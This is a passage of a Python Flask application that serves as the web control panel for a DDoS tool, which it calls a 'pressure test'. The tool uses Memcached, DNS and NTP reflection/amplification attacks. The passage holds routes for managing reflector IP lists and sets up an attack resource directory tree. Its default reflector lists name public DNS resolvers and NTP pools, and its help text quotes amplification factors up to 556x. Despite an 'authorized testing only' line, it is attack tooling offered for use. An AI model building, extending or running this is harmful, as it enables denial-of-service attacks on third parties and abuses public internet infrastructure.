    if not isinstance(servers, list):
        return jsonify({'success': False, 'message': '服务器列表必须是数组'})
    valid = [s.strip() for s in servers if s.strip() and not s.strip().startswith('#')]
    source = request.args.get('source', '').strip()
    filename = get_effective_server_file(method, source or None)
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write('# 每行一个反射器IP或域名\n')
            for s in valid:
                f.write(s + '\n')
        return jsonify({'success': True, 'message': f'已保存 {len(valid)} 个服务器'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/servers/count', methods=['POST'])
def get_server_count():
    try:
        data = request.json
        protocols = data.get('protocols', [])
        total_count = 0
        protocol_counts = {}
        for protocol in protocols:
            if protocol in VALID_SERVER_PROTOCOLS:
                source_paths = list_server_source_paths(protocol)
                count = sum(count_server_entries_in_file(p) for p in source_paths)
                protocol_counts[protocol] = count
                total_count += count
        return jsonify({'success': True, 'total_count': total_count, 'protocol_counts': protocol_counts})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/ping', methods=['POST'])
def ping_target():
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({'success': False, 'message': '缺少目标地址'})
    try:
        cmd = ['ping', '-c', '1', '-W', '2', target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            match = re.search(r'time=(\d+(?:\.\d+)?)\s*ms', result.stdout)
            if match:
                latency = float(match.group(1))
                return jsonify({'success': True, 'latency': latency})
        return jsonify({'success': False, 'message': 'ping超时或无法到达'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/tcping', methods=['POST'])
def tcping():
    import socket
    import time
    data = request.json
    target = data.get('target')
    port = data.get('port', 80)
    timeout = data.get('timeout', 5)  # 默认5秒超时
    if not target:
        return jsonify({'success': False, 'message': '缺少目标地址'})
    try:
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        end = time.time()
        sock.close()
        latency = (end - start) * 1000
        return jsonify({'success': True, 'latency': round(latency, 2)})
    except socket.timeout:
        return jsonify({'success': False, 'message': f'连接超时（{timeout}秒）'})
    except ConnectionRefusedError:
        return jsonify({'success': False, 'message': '连接被拒绝，端口可能未开放'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'连接失败: {str(e)}'})

@app.route('/api/system/info', methods=['GET'])
def get_system_info():
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        net_io = psutil.net_io_counters()
        disk = psutil.disk_usage('/')
        return jsonify({
            'success': True,
            'cpu_percent': cpu_percent,
            'memory': {
                'total': memory.total,
                'available': memory.available,
                'percent': memory.percent,
                'used': memory.used,
                'free': memory.free
            },
            'network': {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv
            },
            'disk': {
                'total': disk.total,
                'used': disk.used,
                'free': disk.free,
                'percent': disk.percent
            },
            'timestamp': time.time()
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/results')
def results():
    return render_template('results.html')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'success': False, 'message': '资源未找到'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'success': False, 'message': '服务器内部错误'}), 500

# ========= 启动辅助 =========
def check_root_privileges():
    if os.geteuid() != 0:
        print("⚠️  警告: 某些功能需要root权限才能正常运行")
        print("💡 建议使用: sudo python3 app.py")
        return False
    return True

def migrate_server_files():
    """将旧格式 servers.txt 迁移至 ip_lists/default.txt"""
    for protocol in VALID_SERVER_PROTOCOLS:
        ip_lists_dir = Path(ATTACK_RESOURCES_ROOT) / protocol / 'resources' / 'ip_lists'
        ip_lists_dir.mkdir(parents=True, exist_ok=True)
        old_file = Path(ATTACK_RESOURCES_ROOT) / protocol / 'resources' / 'servers.txt'
        new_file = ip_lists_dir / 'default.txt'
        if old_file.exists() and not new_file.exists():
            content = old_file.read_text(encoding='utf-8')
            new_file.write_text(content, encoding='utf-8')
            logger.info(f"已迁移 {protocol} 服务器列表: {old_file} -> {new_file}")
        elif not old_file.exists() and not new_file.exists():
            new_file.write_text('# 每行一个反射器IP或域名\n', encoding='utf-8')

def create_required_directories():
    dirs = [
        ATTACK_RESOURCES_ROOT,
        os.path.join(ATTACK_RESOURCES_ROOT, 'tcp', 'code'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'tcp', 'resources'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'tcp', 'resources', 'ip_lists'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'tcp', 'config'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'tcp', 'runs'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'memcached', 'code'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'memcached', 'resources'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'memcached', 'resources', 'ip_lists'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'memcached', 'config'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'memcached', 'runs'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'dns', 'code'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'dns', 'resources'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'dns', 'resources', 'ip_lists'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'dns', 'config'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'dns', 'runs'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'ntp', 'code'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'ntp', 'resources'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'ntp', 'resources', 'ip_lists'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'ntp', 'config'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'ntp', 'runs'),
        os.path.join(ATTACK_RESOURCES_ROOT, 'shared', 'ip_lists'),
        'static',
        'templates',
        'logs',
    ]
    for d in dirs:
        os.makedirs(d, exist_ok=True)
        print(f"📁 确保目录存在: {d}")

def create_default_server_files():
    defaults = {
        'memcached.txt': ["# Memcached服务器列表", "127.0.0.1"],
        'dns.txt': ["# DNS服务器列表", "8.8.8.8", "1.1.1.1", "9.9.9.9", "8.8.4.4"],
        'ntp.txt': ["# NTP服务器列表", "pool.ntp.org", "time.google.com", "time.windows.com", "time.apple.com"]
    }
    for filename, lines in defaults.items():
        protocol = filename.replace('.txt', '')
        path = os.path.join(ATTACK_RESOURCES_ROOT, protocol, 'resources', 'ip_lists', 'default.txt')
        if not os.path.exists(path):
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(lines))
            print(f"📄 创建默认服务器文件: {protocol}/ip_lists/default.txt")

def setup_logging():
    log_dir = 'logs'
    os.makedirs(log_dir, exist_ok=True)
    log_file = f'{log_dir}/pressure_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
    file_handler = logging.FileHandler(log_file, encoding='utf-8')
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
    logging.getLogger().addHandler(file_handler)
    print(f"📝 日志文件: {log_file}")

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                多协议联合压力测试系统 v4.0                   ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

def print_help():
    help_text = """
使用方法:
  1. 启动服务器: sudo python3 app.py
  2. 打开浏览器访问: http://localhost:5000
  3. 配置测试参数并开始测试

支持协议:
  - Memcached反射攻击 (放大倍数: 10-50x)
  - DNS反射攻击 (放大倍数: 28-54x)
  - NTP反射攻击 (放大倍数: 556x)

注意事项:
  - 仅用于授权的压力测试
  - 需要root权限
"""
    print(help_text)

if __name__ == '__main__':
    print_banner()
    check_root_privileges()
    create_required_directories()
    create_default_server_files()
    migrate_server_files()
    setup_logging()
    print_help()
    print("\n🚀 启动压力测试Web界面...")
    print("🌐 访问地址: http://localhost:5000")
    print("=" * 60)
    try:
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        print("\n🛑 服务器被用户中断")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ 启动服务器失败: {str(e)}")
        traceback.print_exc()
        sys.exit(1)
